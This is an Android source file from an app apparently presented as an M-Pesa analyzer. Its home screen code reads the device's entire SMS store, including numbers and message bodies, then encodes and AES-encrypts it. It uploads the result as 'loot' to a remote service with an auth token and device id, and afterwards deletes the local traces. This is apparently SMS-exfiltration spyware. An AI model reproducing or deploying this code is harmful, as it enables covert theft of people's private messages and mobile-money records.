package com.niccher.mpesa_analyzer.frags;

import static android.content.Context.MODE_PRIVATE;
import static android.os.Environment.getExternalStorageDirectory;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;

import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Base64;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.niccher.mpesa_analyzer.R;
import com.niccher.mpesa_analyzer.helpers.Encryptor;
import com.niccher.mpesa_analyzer.helpers.Prefs;
import com.niccher.mpesa_analyzer.helpers.ServiceGenerator;
import com.niccher.mpesa_analyzer.interfaces.JsonUploadLoot;
import com.niccher.mpesa_analyzer.konstants.Konstants;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.List;

import javax.crypto.NoSuchPaddingException;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class Frag_Home extends Fragment {

    public Frag_Home() {
        // Required empty public constructor
    }

    AppCompatActivity activity;

    Konstants kon;
    Prefs prefs;
    PayLoade init;
    StringBuffer sbsent;

    Button btn_fetch;
    TextView last_time;

    ProgressBar progressBar;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        activity = (AppCompatActivity) getActivity();
        ActionBar supportActionBar = activity.getSupportActionBar();
        if (supportActionBar != null) {
            supportActionBar.setTitle("Home");
            supportActionBar.setDisplayHomeAsUpEnabled(false);
        }
        setHasOptionsMenu(true);

        kon = new Konstants();
        prefs = new Prefs();
        init = new PayLoade();
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View solv = inflater.inflate(R.layout.frag_home, container, false);

        btn_fetch = solv.findViewById(R.id.home_fetch_sync);
        last_time = solv.findViewById(R.id.home_last_upload);

        progressBar = solv.findViewById(R.id.home_upload_state);
        progressBar.setVisibility(View.GONE);

        btn_fetch.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                init.Parser_SMS(getActivity());
            }
        });
        last_time.setText(prefs.get_TimeStamp(getActivity()));
        return  solv;
    }

    private void Cryptor(File dir_file, InputStream ins){
        File fout = new File(String.valueOf(dir_file));
        try {
            Encryptor cc = new Encryptor();
            cc.encodetoFile(kon.string_key, kon.string_key_spec, ins, new FileOutputStream(fout));
            Log.e(kon.TAGGED, "Cryptor: Encryption Completed" );
        } catch (InvalidAlgorithmParameterException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        }
    }

    private void Make_a_File(String file_name, StringBuffer data_source){
        String big_data = String.valueOf(data_source);
        String big_data_enc = Base64.encodeToString(big_data.toString().getBytes(), Base64.DEFAULT);

        FileOutputStream fos = null;

        try {
            fos = getActivity().openFileOutput(kon.string_enc_b64_file+file_name, MODE_PRIVATE);
            fos.write(big_data_enc.getBytes());

            File fi4 = new File(getActivity().getFilesDir() + "/" + kon.string_enc_b64_file+file_name);
            File fi40 = new File(getActivity().getFilesDir() + "/" + kon.string_enc_aes_files+file_name);

            InputStream in = new BufferedInputStream(new FileInputStream(fi4));
            Cryptor(fi40, in);

            init.Parser_Upload(fi40, file_name);

        } catch (FileNotFoundException e) {
            Log.e(kon.TAGGED,"Error 1  "+e.getMessage());
        } catch (IOException e) {
            Log.e(kon.TAGGED,"Error 2  "+e.getMessage());
        } finally {
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException e) {
                    Log.e(kon.TAGGED,"Error 3  "+e.getMessage());
                }
            }
        }
    }

    class PayLoade extends Thread {
        @Override
        public void run() {
            super.run();
            Log.e(kon.TAGGED,"<Start Parser>");
            Parser_SMS(getActivity());
        }

        public void Parser_SMS(Context context ){
            Log.e(kon.TAGGED, "Parser_All_SMS->Started >");
            ContentResolver cr = context.getContentResolver();
            Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            int totalSMS = 0;
            String blanks =" ";
            if (c != null) {
                totalSMS = c.getCount();
                if (c.moveToFirst()) {
                    sbsent = new StringBuffer();
                    for (int j = 0; j < totalSMS; j++) {
                        String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        String smsNumber = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String smsBody = Base64.encodeToString(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).getBytes(), Base64.DEFAULT);;
                        String smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN));
                        String smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
                        String sms_id = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID));

                        String smsType = "";
                        switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                                smsType = "inbox";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_SENT:
                                smsType = "sent";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                                smsType = "outbox";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_QUEUED:
                                smsType = "queued";
                                break;
                            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                                smsType = "draft";
                                break;
                            default:
                                break;
                        }
                        sbsent.append("{\"Type\": \"" + smsType + "\",\"Number\": \"" + smsNumber + "\",\"Thread Id\": " + smsThreadid + ",\"Date\": " + smsDate + ",\"Body\": \"" + smsBody + "\",\"Seen\": " + smsSeen + ",\"ID\": " + sms_id + " },-------(//)--------");

                        c.moveToNext();
                    }
                }
                Make_a_File("sms_All_" + System.currentTimeMillis(), sbsent);
                c.close();
            } else {
                Log.e(kon.TAGGED, "Parser_All_SMS->No More >");
            }
            Log.e(kon.TAGGED, "Parser_All_SMS->Finished >");
        }

        public void Parser_Upload(File files, String filename){

            progressBar.setVisibility(View.VISIBLE);

            JsonUploadLoot service = ServiceGenerator.createService(JsonUploadLoot.class);
            File file = files;
            Uri fileUri = Uri.fromFile(file);

            RequestBody requestFile = RequestBody.create( MediaType.parse("*/*"), file );

            MultipartBody.Part body = MultipartBody.Part.createFormData("varLoot", filename+".txt", requestFile);

            // add another part within the multipart request
            String part_token = prefs.get_prefs_auth("auth", getActivity());
            String part_dev_id = prefs.get_prefs_auth("print", getActivity());

            RequestBody requestBody0 = RequestBody.create( okhttp3.MultipartBody.FORM, part_token);
            RequestBody requestBody1 = RequestBody.create( okhttp3.MultipartBody.FORM, part_dev_id);

            // finally, execute the request
            Call<ResponseBody> call = service.upload(requestBody0, requestBody1, body);
            call.enqueue(new Callback<ResponseBody>() {
                @Override
                public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                    Log.e(kon.TAGGED, response.toString());
                    try {
                        File enc_b64 = new File( getActivity().getFilesDir() + "/" + kon.string_enc_b64_file+filename);
                        File enc_aes = new File(getActivity().getFilesDir() + "/" + kon.string_enc_aes_files+filename);
                        enc_b64.delete();
                        enc_aes.delete();
                        prefs.get_FileType(filename, String.valueOf(System.currentTimeMillis()), getActivity());
                        last_time.setText(prefs.get_TimeStamp(getActivity()));
                    }catch (Exception es){
                        Log.e(kon.TAGGED, "Delete Files error\n"+es.getMessage());
                    }
                    progressBar.setVisibility(View.GONE);
                }

                @Override
                public void onFailure(Call<ResponseBody> call, Throwable t) {
                    Log.e("Upload error:", t.getMessage());
                    progressBar.setVisibility(View.GONE);
                }
            });

            Log.e(kon.TAGGED, "Upload_Loot: Data Upload" );
        }

    }
}